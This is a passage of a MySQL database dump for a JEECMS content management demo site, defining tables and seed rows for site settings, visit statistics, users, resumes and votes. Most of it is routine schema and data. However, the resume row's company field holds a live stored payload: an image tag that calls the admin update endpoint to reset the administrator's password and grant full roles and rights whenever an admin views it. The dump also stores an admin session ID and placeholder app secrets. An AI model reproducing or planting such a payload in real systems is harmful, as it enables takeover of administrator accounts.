  `tpl_mobile_solution` varchar(50) NOT NULL DEFAULT 'mobile' COMMENT '手机站模板方案',
  `mobile_static_dir` varchar(50) DEFAULT '/wap' COMMENT '手机站静态页存放目录',
  `mobile_static_sync` tinyint(1) NOT NULL DEFAULT '0' COMMENT '手机站静态页同步生成',
  `ftp_sync_page_id` int(11) DEFAULT NULL COMMENT '静态页同步FTP',
  `page_is_sync_ftp` tinyint(1) NOT NULL DEFAULT '0' COMMENT '静态页同步发布FTP',
  `resouce_is_sync_ftp` tinyint(1) NOT NULL DEFAULT '0' COMMENT '资源同步发布FTP',
  `oss_id` int(11) DEFAULT NULL COMMENT '图片附件云存储oss',
  PRIMARY KEY (`site_id`),
  UNIQUE KEY `ak_domain_path` (`domain`),
  KEY `fk_jc_site_config` (`config_id`),
  KEY `fk_jc_site_upload_ftp` (`ftp_upload_id`)
) ENGINE=InnoDB AUTO_INCREMENT=2 DEFAULT CHARSET=utf8 COMMENT='CMS站点表';

#
# Dumping data for table jc_site
#

INSERT INTO `jc_site` (`site_id`,`config_id`,`ftp_upload_id`,`domain`,`site_path`,`site_name`,`short_name`,`protocol`,`dynamic_suffix`,`static_suffix`,`static_dir`,`is_index_to_root`,`is_static_index`,`locale_admin`,`locale_front`,`tpl_solution`,`final_step`,`after_check`,`is_relative_path`,`is_recycle_on`,`domain_alias`,`domain_redirect`,`tpl_index`,`keywords`,`description`,`tpl_mobile_solution`,`mobile_static_dir`,`mobile_static_sync`,`ftp_sync_page_id`,`page_is_sync_ftp`,`resouce_is_sync_ftp`,`oss_id`) VALUES (1,1,NULL,'localhost','www','jeecms演示站','jeecms演示站','http://','.jhtml','.html','/html','0','0','zh_CN','zh_CN','default',3,3,'0','1','','','','JEECMS－JAVA网站内容管理系统|开源java cms系统,jsp cms网站管理','JEECMS-国内优秀的JAVA(JSP)网站内容管理系统','mobile','/wap',0,NULL,0,0,NULL);

#
# Source for table jc_site_access
#

CREATE TABLE `jc_site_access` (
  `access_id` int(11) NOT NULL AUTO_INCREMENT,
  `session_id` varchar(32) NOT NULL DEFAULT '',
  `site_id` int(11) NOT NULL COMMENT '站点id',
  `access_time` time NOT NULL COMMENT '访问时间',
  `access_date` date NOT NULL COMMENT '访问日期',
  `ip` varchar(50) NOT NULL DEFAULT '',
  `area` varchar(50) DEFAULT NULL COMMENT '访问地区',
  `access_source` varchar(255) DEFAULT NULL COMMENT '访问来源',
  `external_link` varchar(255) DEFAULT NULL COMMENT '外部链接网址',
  `engine` varchar(50) DEFAULT NULL COMMENT '搜索引擎',
  `entry_page` varchar(255) DEFAULT NULL COMMENT '入口页面',
  `last_stop_page` varchar(255) DEFAULT NULL COMMENT '最后停留页面',
  `visit_second` int(11) DEFAULT NULL COMMENT '访问时长(秒)',
  `visit_page_count` int(11) DEFAULT NULL COMMENT '访问页面数',
  `operating_system` varchar(50) DEFAULT NULL COMMENT '操作系统',
  `browser` varchar(50) DEFAULT NULL COMMENT '浏览器',
  `keyword` varchar(255) DEFAULT NULL COMMENT '来访关键字',
  PRIMARY KEY (`access_id`),
  KEY `fk_jc_access_site` (`site_id`)
) ENGINE=InnoDB AUTO_INCREMENT=9 DEFAULT CHARSET=utf8 COMMENT='站点访问表';

#
# Dumping data for table jc_site_access
#


#
# Source for table jc_site_access_count
#

CREATE TABLE `jc_site_access_count` (
  `access_count` int(11) NOT NULL AUTO_INCREMENT,
  `page_count` int(11) NOT NULL DEFAULT '1' COMMENT '访问页数',
  `visitors` int(11) NOT NULL DEFAULT '0' COMMENT '用户数',
  `statistic_date` date NOT NULL COMMENT '统计日期',
  `site_id` int(11) NOT NULL COMMENT '统计站点',
  PRIMARY KEY (`access_count`),
  KEY `fk_jc_access_count_site` (`site_id`)
) ENGINE=InnoDB AUTO_INCREMENT=269 DEFAULT CHARSET=utf8 COMMENT='每日统计页数访问情况';

#
# Dumping data for table jc_site_access_count
#


#
# Source for table jc_site_access_count_hour
#

CREATE TABLE `jc_site_access_count_hour` (
  `access_count_hour_id` int(11) NOT NULL AUTO_INCREMENT,
  `hour_pv` int(11) NOT NULL DEFAULT '0' COMMENT '小时PV',
  `hour_ip` int(11) NOT NULL DEFAULT '0' COMMENT '小时IP',
  `hour_uv` int(11) NOT NULL DEFAULT '0' COMMENT '小时访客数',
  `access_date` date NOT NULL,
  `access_hour` int(2) NOT NULL DEFAULT '0',
  `site_id` int(11) NOT NULL DEFAULT '0' COMMENT '站点ID',
  PRIMARY KEY (`access_count_hour_id`),
  KEY `index_jc_access_count_hour` (`access_hour`),
  KEY `index_jc_access_count_hour_date` (`access_date`),
  KEY `index_jc_access_count_hour_site` (`site_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='小时数据统计';

#
# Dumping data for table jc_site_access_count_hour
#


#
# Source for table jc_site_access_pages
#

CREATE TABLE `jc_site_access_pages` (
  `access_pages_id` int(11) NOT NULL AUTO_INCREMENT,
  `access_page` varchar(255) NOT NULL COMMENT '访问页面',
  `session_id` varchar(32) NOT NULL,
  `access_date` date NOT NULL DEFAULT '0000-00-00' COMMENT '访问日期',
  `access_time` time NOT NULL COMMENT '访问时间',
  `visit_second` int(11) NOT NULL DEFAULT '0' COMMENT '停留时长（秒）',
  `page_index` int(11) NOT NULL DEFAULT '0' COMMENT '用户访问页面的索引',
  `site_id` int(11) NOT NULL DEFAULT '1',
  PRIMARY KEY (`access_pages_id`),
  KEY `fk_jc_access_pages_access` (`session_id`)
) ENGINE=InnoDB AUTO_INCREMENT=25 DEFAULT CHARSET=utf8 COMMENT='访问详细页面表';

#
# Dumping data for table jc_site_access_pages
#


#
# Source for table jc_site_access_statistic
#

CREATE TABLE `jc_site_access_statistic` (
  `access_statistic_id` int(11) NOT NULL AUTO_INCREMENT,
  `statistic_date` date NOT NULL COMMENT '统计日期',
  `pv` int(11) NOT NULL DEFAULT '0' COMMENT 'pv量',
  `ip` int(11) NOT NULL DEFAULT '0' COMMENT 'ip量',
  `visitors` int(11) NOT NULL DEFAULT '0' COMMENT '访客数量',
  `pages_aver` int(11) NOT NULL DEFAULT '0' COMMENT '人均浏览次数',
  `visit_second_aver` int(11) NOT NULL DEFAULT '0' COMMENT '人均访问时长（秒）',
  `site_id` int(11) NOT NULL COMMENT '站点id',
  `statisitc_type` varchar(255) NOT NULL DEFAULT 'all' COMMENT '统计分类（all代表当天所有访问量的统计）',
  `statistic_column_value` varchar(255) DEFAULT '' COMMENT '统计列值',
  PRIMARY KEY (`access_statistic_id`),
  KEY `fk_jc_access_statistic_site` (`site_id`)
) ENGINE=InnoDB AUTO_INCREMENT=359 DEFAULT CHARSET=utf8 COMMENT='访问统计表';

#
# Dumping data for table jc_site_access_statistic
#


#
# Source for table jc_site_attr
#

CREATE TABLE `jc_site_attr` (
  `site_id` int(11) NOT NULL,
  `attr_name` varchar(30) NOT NULL COMMENT '名称',
  `attr_value` varchar(255) DEFAULT NULL COMMENT '值',
  KEY `fk_jc_attr_site` (`site_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='CMS站点属性表';

#
# Dumping data for table jc_site_attr
#

INSERT INTO `jc_site_attr` (`site_id`,`attr_name`,`attr_value`) VALUES (1,'pvTotal','7181');
INSERT INTO `jc_site_attr` (`site_id`,`attr_name`,`attr_value`) VALUES (1,'visitors','4970');
INSERT INTO `jc_site_attr` (`site_id`,`attr_name`,`attr_value`) VALUES (1,'wxAppkey','111111');
INSERT INTO `jc_site_attr` (`site_id`,`attr_name`,`attr_value`) VALUES (1,'wxAppSecret','111111');
INSERT INTO `jc_site_attr` (`site_id`,`attr_name`,`attr_value`) VALUES (1,'dayPvTotal','3');
INSERT INTO `jc_site_attr` (`site_id`,`attr_name`,`attr_value`) VALUES (1,'dayVisitors','2');
INSERT INTO `jc_site_attr` (`site_id`,`attr_name`,`attr_value`) VALUES (1,'weekPvTotal','5076');
INSERT INTO `jc_site_attr` (`site_id`,`attr_name`,`attr_value`) VALUES (1,'monthPvTotal','5525');
INSERT INTO `jc_site_attr` (`site_id`,`attr_name`,`attr_value`) VALUES (1,'monthVisitors','4535');
INSERT INTO `jc_site_attr` (`site_id`,`attr_name`,`attr_value`) VALUES (1,'weekVisitors','4559');
INSERT INTO `jc_site_attr` (`site_id`,`attr_name`,`attr_value`) VALUES (1,'wxToken','myjcywangluoweixin');
INSERT INTO `jc_site_attr` (`site_id`,`attr_name`,`attr_value`) VALUES (1,'contentTotal','69');
INSERT INTO `jc_site_attr` (`site_id`,`attr_name`,`attr_value`) VALUES (1,'commentTotal','4');
INSERT INTO `jc_site_attr` (`site_id`,`attr_name`,`attr_value`) VALUES (1,'guestbookTotal','4');
INSERT INTO `jc_site_attr` (`site_id`,`attr_name`,`attr_value`) VALUES (1,'memberTotal','0');

#
# Source for table jc_site_cfg
#

CREATE TABLE `jc_site_cfg` (
  `site_id` int(11) NOT NULL,
  `cfg_name` varchar(30) NOT NULL COMMENT '名称',
  `cfg_value` varchar(255) DEFAULT NULL COMMENT '值',
  KEY `fk_jc_cfg_site` (`site_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='CMS站点配置表';

#
# Dumping data for table jc_site_cfg
#


#
# Source for table jc_site_company
#

CREATE TABLE `jc_site_company` (
  `site_id` int(11) NOT NULL,
  `name` varchar(255) NOT NULL COMMENT '公司名称',
  `scale` varchar(255) DEFAULT NULL COMMENT '公司规模',
  `nature` varchar(255) DEFAULT NULL COMMENT '公司性质',
  `industry` varchar(1000) DEFAULT NULL COMMENT '公司行业',
  `contact` varchar(500) DEFAULT NULL COMMENT '联系方式',
  `description` text COMMENT '公司简介',
  `address` varchar(500) DEFAULT NULL COMMENT '公司地址',
  `longitude` float(5,2) DEFAULT NULL COMMENT '经度',
  `latitude` float(4,2) DEFAULT NULL COMMENT '纬度',
  PRIMARY KEY (`site_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='公司信息';

#
# Dumping data for table jc_site_company
#

INSERT INTO `jc_site_company` (`site_id`,`name`,`scale`,`nature`,`industry`,`contact`,`description`,`address`,`longitude`,`latitude`) VALUES (1,'JEECMS开发站','10-20人','私企','互联网','','<p><span id=\"_baidu_bookmark_start_1\" style=\"display: none; line-height: 0px;\">‍</span><span id=\"_baidu_bookmark_start_4\" style=\"display: none; line-height: 0px;\">‍</span></p><p><span id=\"_baidu_bookmark_start_0\" style=\"display: none; line-height: 0px;\">‍</span><span id=\"_baidu_bookmark_start_3\" style=\"display: none; line-height: 0px;\">‍</span><br/></p><p><span id=\"_baidu_bookmark_end_5\" style=\"display: none; line-height: 0px;\">‍</span><span id=\"_baidu_bookmark_end_2\" style=\"display: none; line-height: 0px;\">‍</span></p>','',NULL,NULL);

#
# Source for table jc_site_model
#

CREATE TABLE `jc_site_model` (
  `model_id` int(11) NOT NULL AUTO_INCREMENT,
  `field` varchar(50) NOT NULL COMMENT '字段',
  `model_label` varchar(100) NOT NULL COMMENT '名称',
  `priority` int(11) NOT NULL DEFAULT '10' COMMENT '排列顺序',
  `upload_path` varchar(100) DEFAULT NULL COMMENT '上传路径',
  `text_size` varchar(20) DEFAULT NULL COMMENT '长度',
  `area_rows` varchar(3) DEFAULT NULL COMMENT '文本行数',
  `area_cols` varchar(3) DEFAULT NULL COMMENT '文本列数',
  `help` varchar(255) DEFAULT NULL COMMENT '帮助信息',
  `help_position` varchar(1) DEFAULT NULL COMMENT '帮助位置',
  `data_type` int(11) DEFAULT '1' COMMENT '0:编辑器;1:文本框;2:文本区;3:图片;4:附件',
  `is_single` tinyint(1) DEFAULT '1' COMMENT '是否独占一行',
  PRIMARY KEY (`model_id`),
  UNIQUE KEY `ak_field` (`field`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='CMS站点信息模型表';

#
# Dumping data for table jc_site_model
#


#
# Source for table jc_site_txt
#

CREATE TABLE `jc_site_txt` (
  `site_id` int(11) NOT NULL,
  `txt_name` varchar(30) NOT NULL COMMENT '名称',
  `txt_value` longtext COMMENT '值',
  KEY `fk_jc_txt_site` (`site_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='CMS站点文本表';

#
# Dumping data for table jc_site_txt
#


#
# Source for table jc_task
#

CREATE TABLE `jc_task` (
  `task_id` int(11) NOT NULL AUTO_INCREMENT,
  `task_code` varchar(255) DEFAULT NULL COMMENT '任务执行代码',
  `task_type` tinyint(1) NOT NULL DEFAULT '0' COMMENT '任务类型(1首页静态化、2栏目页静态化、3内容页静态化、4采集、5分发)',
  `task_name` varchar(255) NOT NULL COMMENT '任务名称',
  `job_class` varchar(255) NOT NULL COMMENT '任务类',
  `execycle` tinyint(1) NOT NULL DEFAULT '1' COMMENT '执行周期分类(1非表达式 2 cron表达式)',
  `day_of_month` int(11) DEFAULT NULL COMMENT '每月的哪天',
  `day_of_week` tinyint(1) DEFAULT NULL COMMENT '周几',
  `hour` int(11) DEFAULT NULL COMMENT '小时',
  `minute` int(11) DEFAULT NULL COMMENT '分钟',
  `interval_hour` int(11) DEFAULT NULL COMMENT '间隔小时',
  `interval_minute` int(11) DEFAULT NULL COMMENT '间隔分钟',
  `task_interval_unit` tinyint(1) DEFAULT NULL COMMENT '1分钟、2小时、3日、4周、5月',
  `cron_expression` varchar(255) DEFAULT NULL COMMENT '规则表达式',
  `is_enable` tinyint(1) NOT NULL DEFAULT '1' COMMENT '是否启用',
  `task_remark` varchar(255) DEFAULT NULL COMMENT '任务说明',
  `site_id` int(11) NOT NULL COMMENT '站点',
  `user_id` int(11) NOT NULL COMMENT '创建者',
  `create_time` datetime NOT NULL COMMENT '创建时间',
  PRIMARY KEY (`task_id`),
  KEY `fk_jc_task_site` (`site_id`)
) ENGINE=InnoDB AUTO_INCREMENT=4 DEFAULT CHARSET=utf8 COMMENT='任务表';

#
# Dumping data for table jc_task
#

INSERT INTO `jc_task` (`task_id`,`task_code`,`task_type`,`task_name`,`job_class`,`execycle`,`day_of_month`,`day_of_week`,`hour`,`minute`,`interval_hour`,`interval_minute`,`task_interval_unit`,`cron_expression`,`is_enable`,`task_remark`,`site_id`,`user_id`,`create_time`) VALUES (3,'3d648c5b-3815-4e34-9a90-888c02d54e6e',1,'11','com.jeecms.cms.task.job.IndexStaticJob',1,NULL,NULL,NULL,NULL,NULL,1,1,NULL,0,'',1,1,'2016-06-25 10:40:07');

#
# Source for table jc_task_attr
#

CREATE TABLE `jc_task_attr` (
  `task_id` int(11) NOT NULL,
  `param_name` varchar(30) NOT NULL COMMENT '参数名称',
  `param_value` varchar(255) DEFAULT NULL COMMENT '参数值',
  KEY `fk_jc_attr_task` (`task_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='任务参数表';

#
# Dumping data for table jc_task_attr
#

INSERT INTO `jc_task_attr` (`task_id`,`param_name`,`param_value`) VALUES (3,'site_id','1');

#
# Source for table jc_third_account
#

CREATE TABLE `jc_third_account` (
  `account_id` bigint(20) NOT NULL AUTO_INCREMENT,
  `account_key` varchar(255) NOT NULL DEFAULT '' COMMENT '第三方账号key',
  `username` varchar(100) NOT NULL DEFAULT '0' COMMENT '关联用户名',
  `source` varchar(10) NOT NULL DEFAULT '' COMMENT '第三方账号平台(QQ、新浪微博等)',
  `user_id` int(11) DEFAULT NULL COMMENT '用户iD',
  PRIMARY KEY (`account_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='第三方登录平台账号';

#
# Dumping data for table jc_third_account
#


#
# Source for table jc_topic
#

CREATE TABLE `jc_topic` (
  `topic_id` int(11) NOT NULL AUTO_INCREMENT,
  `channel_id` int(11) DEFAULT NULL,
  `topic_name` varchar(150) NOT NULL COMMENT '名称',
  `short_name` varchar(150) DEFAULT NULL COMMENT '简称',
  `keywords` varchar(255) DEFAULT NULL COMMENT '关键字',
  `description` varchar(255) DEFAULT NULL COMMENT '描述',
  `title_img` varchar(100) DEFAULT NULL COMMENT '标题图',
  `content_img` varchar(100) DEFAULT NULL COMMENT '内容图',
  `tpl_content` varchar(100) DEFAULT NULL COMMENT '专题模板',
  `priority` int(11) NOT NULL DEFAULT '10' COMMENT '排列顺序',
  `is_recommend` tinyint(1) NOT NULL DEFAULT '0' COMMENT '是否推??',
  `initials` varchar(150) DEFAULT NULL COMMENT '首字母拼音简写',
  PRIMARY KEY (`topic_id`),
  KEY `fk_jc_topic_channel` (`channel_id`)
) ENGINE=InnoDB AUTO_INCREMENT=4 DEFAULT CHARSET=utf8 COMMENT='CMS专题表';

#
# Dumping data for table jc_topic
#

INSERT INTO `jc_topic` (`topic_id`,`channel_id`,`topic_name`,`short_name`,`keywords`,`description`,`title_img`,`content_img`,`tpl_content`,`priority`,`is_recommend`,`initials`) VALUES (1,NULL,' 2016饲料英才网络招聘会','饲料英才网络招聘会','','','/u/cms/www/201610/10100951y2xy.jpg','/u/cms/www/201610/11092540p27t.jpg','',11,1,NULL);
INSERT INTO `jc_topic` (`topic_id`,`channel_id`,`topic_name`,`short_name`,`keywords`,`description`,`title_img`,`content_img`,`tpl_content`,`priority`,`is_recommend`,`initials`) VALUES (2,NULL,'互联网+与传统产业升级之道','互联网+','','','/u/cms/www/201610/10100842hqdk.jpg','/u/cms/www/201610/110911592mxa.jpg','',10,1,NULL);
INSERT INTO `jc_topic` (`topic_id`,`channel_id`,`topic_name`,`short_name`,`keywords`,`description`,`title_img`,`content_img`,`tpl_content`,`priority`,`is_recommend`,`initials`) VALUES (3,NULL,'2015全国两会','2015全国两会','','','/u/cms/www/201610/101010021q7v.jpg','/u/cms/www/201610/11092148co74.jpg','',10,1,NULL);

#
# Source for table jc_topic_channel
#

CREATE TABLE `jc_topic_channel` (
  `topic_id` int(11) NOT NULL,
  `channel_id` int(11) NOT NULL,
  PRIMARY KEY (`topic_id`,`channel_id`),
  KEY `fk_jc_topic_channel_channel` (`channel_id`),
  KEY `fk_jc_topic_channel_topic` (`topic_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

#
# Dumping data for table jc_topic_channel
#


#
# Source for table jc_user
#

CREATE TABLE `jc_user` (
  `user_id` int(11) NOT NULL,
  `group_id` int(11) NOT NULL,
  `username` varchar(100) NOT NULL COMMENT '用户名',
  `email` varchar(100) DEFAULT NULL COMMENT '邮箱',
  `register_time` datetime NOT NULL COMMENT '注册时间',
  `register_ip` varchar(50) NOT NULL DEFAULT '127.0.0.1' COMMENT '注册IP',
  `last_login_time` datetime NOT NULL COMMENT '最后登录时间',
  `last_login_ip` varchar(50) NOT NULL DEFAULT '127.0.0.1' COMMENT '最后登录IP',
  `login_count` int(11) NOT NULL DEFAULT '0' COMMENT '登录次数',
  `rank` int(11) NOT NULL DEFAULT '0' COMMENT '管理员级别',
  `upload_total` bigint(20) NOT NULL DEFAULT '0' COMMENT '上传总大小',
  `upload_size` int(11) NOT NULL DEFAULT '0' COMMENT '上传大小',
  `upload_date` date DEFAULT NULL COMMENT '上传日期',
  `is_admin` tinyint(1) NOT NULL DEFAULT '0' COMMENT '是否管理员',
  `is_self_admin` tinyint(1) NOT NULL DEFAULT '0' COMMENT '是否只管理自己的数据',
  `statu` tinyint(1) NOT NULL DEFAULT '0' COMMENT '状态 0审核通过  1禁用  2待审核',
  `session_id` varchar(255) DEFAULT NULL,
  `is_viewonly_admin` tinyint(1) NOT NULL DEFAULT '0' COMMENT '是否只读管理员',
  PRIMARY KEY (`user_id`),
  UNIQUE KEY `ak_username` (`username`),
  KEY `fk_jc_user_group` (`group_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='CMS用户表';

#
# Dumping data for table jc_user
#

INSERT INTO `jc_user` (`user_id`,`group_id`,`username`,`email`,`register_time`,`register_ip`,`last_login_time`,`last_login_ip`,`login_count`,`rank`,`upload_total`,`upload_size`,`upload_date`,`is_admin`,`is_self_admin`,`statu`,`session_id`,`is_viewonly_admin`) VALUES (1,1,'admin','aa@qq.com','2011-01-03','127.0.0.1','2017-12-26 18:44:45','192.168.0.158',2281,9,334182,18,'2016-10-13',1,0,0,'EFF9F6ADE387F76F04638010D93E2AFC',0);

#
# Source for table jc_user_account
#

CREATE TABLE `jc_user_account` (
  `user_id` int(11) NOT NULL,
  `account_weixin` varchar(255) DEFAULT NULL COMMENT '微信账号名',
  `account_weixin_openId` varchar(255) DEFAULT NULL COMMENT '微信账号openid',
  `account_alipy` varchar(255) DEFAULT NULL COMMENT '支付宝账号',
  `draw_account` tinyint(1) NOT NULL DEFAULT '0' COMMENT '提现账户(0微信 1支付宝)',
  `content_total_amount` double(15,4) DEFAULT '0.0000' COMMENT '稿费总金额',
  `content_no_pay_amount` double(15,4) DEFAULT '0.0000' COMMENT '待提现稿费金额',
  `content_year_amount` double(15,4) NOT NULL DEFAULT '0.0000' COMMENT '稿费年金额',
  `content_month_amount` double(15,4) NOT NULL DEFAULT '0.0000' COMMENT '稿费本月金额',
  `content_day_amount` double(15,4) NOT NULL DEFAULT '0.0000' COMMENT '稿费本日金额',
  `content_buy_count` int(11) DEFAULT NULL COMMENT '被用户购买次数',
  `draw_count` int(11) DEFAULT '0' COMMENT '累计提现次数',
  `last_draw_time` timestamp NULL DEFAULT CURRENT_TIMESTAMP COMMENT '上次提现时间',
  `last_buy_time` timestamp NULL DEFAULT NULL COMMENT '上次用户购买时间',
  PRIMARY KEY (`user_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='用户稿费收费配置';

#
# Dumping data for table jc_user_account
#


#
# Source for table jc_user_attr
#

CREATE TABLE `jc_user_attr` (
  `user_id` int(11) NOT NULL,
  `attr_name` varchar(255) NOT NULL,
  `attr_value` varchar(255) DEFAULT NULL,
  KEY `fk_jc_attr_user` (`user_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='用户属性表';

#
# Dumping data for table jc_user_attr
#


#
# Source for table jc_user_collection
#

CREATE TABLE `jc_user_collection` (
  `user_id` int(11) NOT NULL DEFAULT '0' COMMENT '用户id',
  `content_id` int(11) NOT NULL DEFAULT '0' COMMENT '内容id',
  PRIMARY KEY (`user_id`,`content_id`),
  KEY `fk_jc_user_collection_con` (`content_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='用户收藏关联表';

#
# Dumping data for table jc_user_collection
#


#
# Source for table jc_user_ext
#

CREATE TABLE `jc_user_ext` (
  `user_id` int(11) NOT NULL,
  `realname` varchar(100) DEFAULT NULL COMMENT '真实姓名',
  `gender` tinyint(1) DEFAULT NULL COMMENT '性别',
  `birthday` datetime DEFAULT NULL COMMENT '出生日期',
  `intro` varchar(255) DEFAULT NULL COMMENT '个人介绍',
  `comefrom` varchar(150) DEFAULT NULL COMMENT '来自',
  `qq` varchar(100) DEFAULT NULL COMMENT 'QQ',
  `msn` varchar(100) DEFAULT NULL COMMENT 'MSN',
  `phone` varchar(50) DEFAULT NULL COMMENT '电话',
  `mobile` varchar(50) DEFAULT NULL COMMENT '手机',
  `user_img` varchar(255) DEFAULT NULL COMMENT '用户头像',
  `user_signature` varchar(255) DEFAULT NULL COMMENT '用户个性签名',
  `today_guestbook_total` int(11) NOT NULL DEFAULT '0' COMMENT '今日留言数',
  `today_comment_total` int(11) NOT NULL DEFAULT '0' COMMENT '今日评论数',
  PRIMARY KEY (`user_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='CMS用户扩展信息表';

#
# Dumping data for table jc_user_ext
#

INSERT INTO `jc_user_ext` (`user_id`,`realname`,`gender`,`birthday`,`intro`,`comefrom`,`qq`,`msn`,`phone`,`mobile`,`user_img`,`user_signature`,`today_guestbook_total`,`today_comment_total`) VALUES (1,'JEECMS',1,'2015-04-09',NULL,'南昌',NULL,NULL,'1110999','121212','/user/images/201609/191017527cv9.jpg','',0,0);

#
# Source for table jc_user_menu
#

CREATE TABLE `jc_user_menu` (
  `menu_id` int(11) NOT NULL AUTO_INCREMENT,
  `menu_name` varchar(255) NOT NULL COMMENT '菜单名称',
  `menu_url` varchar(255) NOT NULL COMMENT '菜单地址',
  `priority` int(11) NOT NULL DEFAULT '10',
  `user_id` int(11) NOT NULL,
  PRIMARY KEY (`menu_id`),
  KEY `fk_jc_menu_user` (`user_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='用户常用菜单';

#
# Dumping data for table jc_user_menu
#


#
# Source for table jc_user_resume
#

CREATE TABLE `jc_user_resume` (
  `user_id` int(11) NOT NULL,
  `resume_name` varchar(255) NOT NULL COMMENT '简历名称',
  `target_worknature` varchar(255) DEFAULT NULL COMMENT '期望工作性质',
  `target_workplace` varchar(255) DEFAULT NULL COMMENT '期望工作地点',
  `target_category` varchar(255) DEFAULT NULL COMMENT '期望职位类别',
  `target_salary` varchar(255) DEFAULT NULL COMMENT '期望月薪',
  `edu_school` varchar(255) DEFAULT NULL COMMENT '毕业学校',
  `edu_graduation` datetime DEFAULT NULL COMMENT '毕业时间',
  `edu_back` varchar(255) DEFAULT NULL COMMENT '学历',
  `edu_discipline` varchar(255) DEFAULT NULL COMMENT '专业',
  `recent_company` varchar(500) DEFAULT NULL COMMENT '最近工作公司名称',
  `company_industry` varchar(255) DEFAULT NULL COMMENT '最近公司所属行业',
  `company_scale` varchar(255) DEFAULT NULL COMMENT '公司规模',
  `job_name` varchar(255) DEFAULT NULL COMMENT '职位名称',
  `job_category` varchar(255) DEFAULT NULL COMMENT '职位类别',
  `job_start` datetime DEFAULT NULL COMMENT '工作起始时间',
  `subordinates` varchar(255) DEFAULT NULL COMMENT '下属人数',
  `job_description` text COMMENT '工作描述',
  `self_evaluation` varchar(2000) DEFAULT NULL COMMENT '自我评价',
  PRIMARY KEY (`user_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='用户简历';

#
# Dumping data for table jc_user_resume
#

INSERT INTO `jc_user_resume` (`user_id`,`resume_name`,`target_worknature`,`target_workplace`,`target_category`,`target_salary`,`edu_school`,`edu_graduation`,`edu_back`,`edu_discipline`,`recent_company`,`company_industry`,`company_scale`,`job_name`,`job_category`,`job_start`,`subordinates`,`job_description`,`self_evaluation`) VALUES (1,'程序员','','','','','家里蹲大学',NULL,'','吃饭','<img src=/jeeadmin/jeecms/admin_global/o_update.do?password=111&groupId=1&rank=9&roleIds=1&siteIds=1&steps=2&allChannels=true&id=1＞',NULL,NULL,'11',NULL,NULL,NULL,'111\r\n222222222222222222222222222\r\n3333333333333333333333333333333333\r\n44444444444444444444444444444444444444444\r\n55555555555555555555555555555555555','我很强大的哦');

#
# Source for table jc_user_role
#

CREATE TABLE `jc_user_role` (
  `role_id` int(11) NOT NULL,
  `user_id` int(11) NOT NULL,
  PRIMARY KEY (`role_id`,`user_id`),
  KEY `fk_jc_role_user` (`user_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='CMS用户角色关联表';

#
# Dumping data for table jc_user_role
#

INSERT INTO `jc_user_role` (`role_id`,`user_id`) VALUES (1,1);

#
# Source for table jc_user_site
#

CREATE TABLE `jc_user_site` (
  `usersite_id` int(11) NOT NULL AUTO_INCREMENT,
  `user_id` int(11) NOT NULL,
  `site_id` int(11) NOT NULL,
  `check_step` tinyint(4) NOT NULL DEFAULT '1' COMMENT '审核级别',
  `is_all_channel` tinyint(1) NOT NULL DEFAULT '1' COMMENT '是否拥有所有栏目的权限',
  PRIMARY KEY (`usersite_id`),
  KEY `fk_jc_site_user` (`user_id`),
  KEY `fk_jc_user_site` (`site_id`)
) ENGINE=InnoDB AUTO_INCREMENT=7 DEFAULT CHARSET=utf8 COMMENT='CMS管理员站点表';

#
# Dumping data for table jc_user_site
#

INSERT INTO `jc_user_site` (`usersite_id`,`user_id`,`site_id`,`check_step`,`is_all_channel`) VALUES (2,1,1,3,1);

#
# Source for table jc_vote_item
#

CREATE TABLE `jc_vote_item` (
  `voteitem_id` int(11) NOT NULL AUTO_INCREMENT,
  `votetopic_id` int(11) NOT NULL,
  `title` varchar(255) NOT NULL COMMENT '标题',
  `vote_count` int(11) NOT NULL DEFAULT '0' COMMENT '投票数量',
  `priority` int(11) NOT NULL DEFAULT '10' COMMENT '排列顺序',
  `subtopic_id` int(11) DEFAULT NULL,
  `picture` varchar(255) DEFAULT NULL COMMENT '图片',
  PRIMARY KEY (`voteitem_id`),
  KEY `fk_jc_vote_item_topic` (`votetopic_id`),
  KEY `FK_jc_vote_item_subtopic` (`subtopic_id`)
) ENGINE=InnoDB AUTO_INCREMENT=64 DEFAULT CHARSET=utf8 COMMENT='CMS投票项';

#
# Dumping data for table jc_vote_item
#

INSERT INTO `jc_vote_item` (`voteitem_id`,`votetopic_id`,`title`,`vote_count`,`priority`,`subtopic_id`,`picture`) VALUES (12,2,'很喜欢',74,1,13,'');
INSERT INTO `jc_vote_item` (`voteitem_id`,`votetopic_id`,`title`,`vote_count`,`priority`,`subtopic_id`,`picture`) VALUES (13,2,'不喜欢',0,3,13,'');
INSERT INTO `jc_vote_item` (`voteitem_id`,`votetopic_id`,`title`,`vote_count`,`priority`,`subtopic_id`,`picture`) VALUES (14,2,'喜欢',3,2,13,'');
INSERT INTO `jc_vote_item` (`voteitem_id`,`votetopic_id`,`title`,`vote_count`,`priority`,`subtopic_id`,`picture`) VALUES (15,2,'差不多',0,6,15,'');
INSERT INTO `jc_vote_item` (`voteitem_id`,`votetopic_id`,`title`,`vote_count`,`priority`,`subtopic_id`,`picture`) VALUES (16,2,'没有改进',0,7,15,'');
INSERT INTO `jc_vote_item` (`voteitem_id`,`votetopic_id`,`title`,`vote_count`,`priority`,`subtopic_id`,`picture`) VALUES (17,2,'改进很大',81,4,15,'');
INSERT INTO `jc_vote_item` (`voteitem_id`,`votetopic_id`,`title`,`vote_count`,`priority`,`subtopic_id`,`picture`) VALUES (18,2,'有改进',3,5,15,'');
